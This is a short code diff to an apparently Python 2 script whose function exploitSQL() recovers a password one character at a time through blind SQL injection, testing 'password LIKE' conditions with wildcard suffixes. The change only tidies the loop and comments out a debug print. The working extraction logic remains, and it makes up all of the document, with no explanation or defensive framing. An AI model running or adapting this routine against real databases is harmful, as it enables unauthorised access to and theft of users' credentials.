@@ -22,20 +22,16 @@ def exploitSQL(): # Loops SQL injection 'password LIKE y%' until password is fou
 
 	query = "password LIKE "
 	passthrough = False
-	while(passthrough == False):
+	while(not passthrough):
 		for i in alphabet:
 			format = "'" + password + i + "%" + "'"
-			query += format
-			if evaluateCondition(query):
+			if evaluateCondition(query + format):
 				password += i
 				print True;
-				query = "password LIKE "
 				break;
-			else:
-				query = "password LIKE "
 			if i == alphabet[-1]:
 				passthrough = True
 	return password
 	
-print evaluateCondition(sys.argv[1])
+#print evaluateCondition(sys.argv[1])
 print exploitSQL()
